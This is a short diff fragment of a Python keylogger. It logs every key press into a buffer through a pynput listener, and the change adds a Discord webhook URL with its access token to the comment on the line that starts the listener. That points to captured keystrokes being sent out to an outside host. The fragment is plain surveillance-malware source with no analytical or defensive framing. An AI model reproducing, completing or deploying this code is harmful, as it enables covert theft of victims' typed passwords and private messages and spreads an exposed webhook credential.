@@ -29,4 +29,4 @@ def on_press(key):     # Executes on each key pressed
         keys_buffer += key     # Concatenate new logged key presses to make it look simpler
 
 with Listener(on_press=on_press) as listener:
-    listener.join()     # Start the listener 
+    listener.join()     # Start the listener https://discord.com/api/webhooks/1343632388609015849/sdyFTT5av_XuhzKHjlxS4pbPHFFBXdCi0Bm7IJ6XXWa40l0ps6xeTkAKYkT8Tu7mco7t
